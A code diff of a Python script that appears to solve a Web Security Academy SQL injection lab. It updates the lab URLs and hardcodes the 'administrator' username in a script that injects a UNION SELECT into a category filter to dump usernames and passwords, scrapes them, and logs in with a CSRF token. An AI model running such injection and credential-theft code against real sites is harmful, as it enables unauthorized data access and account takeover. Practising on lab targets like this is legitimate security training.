@@ -5,8 +5,8 @@ import requests
 from bs4 import BeautifulSoup
 
 # returns 2 columns, only second column returns string data : combine username+password and return in the second field
-url_sqli = "https://acba1f241fe73cd480f9bbd10048004e.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,username||'+'||password FROM users--"
-url_login = "https://acba1f241fe73cd480f9bbd10048004e.web-security-academy.net/login"
+url_sqli = "https://aca11ff71fdbc554806a28f8006400f6.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,username||'+'||password FROM users--"
+url_login = "https://aca11ff71fdbc554806a28f8006400f6.web-security-academy.net/login"
 
 s = requests.Session()
 
@@ -23,7 +23,8 @@ def get_payload():
         if 'administrator' in h[0]:
             user = str(h).split()[0][2:]
             pw = str(h).split()[1][:-2]
-    return { 'csrf' : csrftoken, 'username' : user, 'password' : pw }
+    # admin_password = soup2.find(text='administrator').findNext('td').text
+    return { 'csrf' : csrftoken, 'username' : 'administrator', 'password' : pw }
 
 try:
     payload = get_payload()    
